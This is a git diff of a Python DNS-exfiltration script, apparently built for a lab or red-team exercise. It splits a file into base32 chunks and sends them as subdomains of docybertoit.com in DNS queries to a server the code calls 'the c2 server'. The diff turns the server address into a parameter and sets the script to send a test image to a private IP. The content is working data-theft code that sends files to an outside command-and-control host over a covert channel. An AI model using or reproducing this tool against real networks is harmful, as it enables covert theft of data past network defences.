@@ -12,10 +12,10 @@ import dns.asyncquery
 import dns.asyncresolver
 from dns.exception import Timeout
 import time
-import requests
+# import requests
 
 file_uuid_str = f'{uuid.uuid4()}'
-def send_file_dns_over_udp(filename: str):
+def send_file_dns_over_udp(filename: str, dns_server: str):
 
     
     file = open(filename,"rb")
@@ -45,26 +45,26 @@ def send_file_dns_over_udp(filename: str):
     """
 
     setup_query =  f'{file_uuid_str}.A.{num_chunks}.docybertoit.com'
-    send_plaintext_query(setup_query)
+    send_plaintext_query(query=setup_query, dns_server=dns_server)
     time.sleep(1)
     counter = 0
     for chunk in file_b32_str_list:
         file_chunk_query = f'{file_uuid_str}.D.{counter}.{chunk}.docybertoit.com'
-        send_plaintext_query(file_chunk_query)
+        send_plaintext_query(query=file_chunk_query, dns_server=dns_server)
         counter += 1
 
     finish_query = f'{file_uuid_str}.Z.{counter}.docybertoit.com'
     time.sleep(1)
-    send_plaintext_query(finish_query)
+    send_plaintext_query(query=finish_query,dns_server=dns_server)
 
 
-def send_plaintext_query(query: str):
+def send_plaintext_query(query: str, dns_server: str):
     """sends a query using the dnspython package to the c2 server. 
     """
 
     #https://dnspython.readthedocs.io/en/stable/query.html#dns.query.udp
     q = dns.message.make_query(query, 'A')
-    server = "10.0.10.163"
+    server = dns_server
     try:
         r = dns.query.udp(q=q, where=server, timeout=.00001)
     except dns.exception.Timeout as e:
@@ -136,5 +136,5 @@ def send_file_dns_over_https(filename):
     send_query_dns_over_https(finish_query)
 
 if __name__ == "__main__":
-    #main()
-    send_file_dns_over_https(filename="test_send.txt")
+    send_file_dns_over_udp(filename="smiley.jpg", dns_server="192.168.19.128")
+    #send_file_dns_over_https(filename="test_send.txt")
